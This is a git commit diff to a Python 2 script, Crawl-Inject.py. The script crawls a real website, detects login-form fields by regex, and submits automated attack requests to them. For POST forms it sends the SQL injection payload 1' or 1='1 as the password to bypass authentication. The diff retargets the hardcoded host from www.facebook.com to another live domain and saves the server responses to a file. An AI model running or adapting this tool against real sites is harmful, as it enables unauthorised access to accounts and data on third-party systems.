a87bc1f652fbd3e9669a2fb514ff198d663ea07e
nischay nahata <nischayn22@gmail.com>
2012-05-07 21:15:03 +0530

    Added support for actually detecting the input fields and then making the attacks.

--- Crawl-Inject.py
+++ Crawl-Inject.py
@@ -5,15 +5,27 @@ import urllib2
 import urlparse
 import string
 import urllib
+
+
+if(len(sys.argv)<2):
+	print "Usage <executable> <sublink> \n For example crawler.py /index.html."
+	raise SystemExit
+
 tocrawl = set([sys.argv[1]])
 crawled = set([])
-address = 'www.facebook.com'
+address = 'www.semsolutions.in'
 subaddress = ''
 linkregex = re.compile('<a\s*href=[\'|"](.*?)[\'"].*?>')
+username1regex = re.compile('<input\s*name=[\'|"](.*?)[\'|"]\s*type=[\'|"]text[\'|"].*?>')
+password1regex = re.compile('<input\s*name=[\'|"](.*?)[\'|"]\s*type=[\'|"]password[\'|"].*?>')
+username2regex = re.compile('<input\s*type=[\'|"]text[\'|"]\s*name=[\'|"](.*?)[\'|"].*?>')
+password2regex = re.compile('<input\s*type=[\'|"]password[\'|"]\s*name=[\'|"](.*?)[\'|"].*?>')
+
+	
 while 1:
 	try:
 		crawling = tocrawl.pop()
-		print crawling
+		print 'url is '+address+subaddress+crawling
 	except KeyError:
 		print 'End of task\n-------------------------'
 		raise StopIteration
@@ -32,6 +44,7 @@ while 1:
 			print 'Title of the page is -> ' + title
 
 # Identify that the page has a form (currently works for only 1 form)
+# Identify the method used in the form get or post
 
 	startPos = msg.find('<form')
 	if startPos != -1:
@@ -44,7 +57,7 @@ while 1:
 				method = msg[startPos+8:endPos]
 				print 'Method of the form is ->' + method
 
-# Identify the method used in the form get or post
+# Identify the action used in the form
 
 		startPos = msg.find('action="')
 		if startPos != -1:
@@ -56,22 +69,34 @@ while 1:
 
 #Identify the input parameters in the form using regex
 
+		username = username1regex.findall(msg)+username2regex.findall(msg)
+		password = password1regex.findall(msg)+password2regex.findall(msg)
+		
+		if(len(username)!=0 and len(password)!=0):
 
+			username = username.pop()
+			password = password.pop()
+			print username
+			print password
 
 #SQL Injections go here
-		conn = httplib.HTTPConnection(address)
-		if method == 'get':
-			conn.request("GET",subaddress+'/'+action+'?login=hello&password=password')
-		elif method == 'GET':
-			conn.request("GET",subaddress+'/'+action+'?login=hello&password=password')
-		else:
-			params = urllib.urlencode({'@login': 'hello', '@password': 'password'})
-			headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
-			conn.request("post",subaddress+'/'+action,params,headers)
-		res = conn.getresponse()
-		print res.status, res.reason
-		data = res.read()
-		print data+'----------------------'+'Injection done'
+			conn = httplib.HTTPConnection(address)
+			if method == 'get':
+				conn.request("GET",subaddress+'/'+action+'?'+username+'=niks&'+password+'=niks')
+			elif method == 'GET':
+				conn.request("GET",subaddress+'/'+action+'?'+username+'=niks&'+password+'=niks')
+			else:
+				params = urllib.urlencode({'@'+username: 'nischayn22@gmail.com', '@'+password: '1\' or 1=\'1'})
+				headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
+				conn.request("post",subaddress+'/'+action,params,headers)
+			res = conn.getresponse()
+			print res.status, res.reason
+			data = res.read()
+			f = open('crawler.html', 'r+')
+			f.write(data)
+
+
+	#		print data+'----------------------'+'Injection done'
 	
 
 
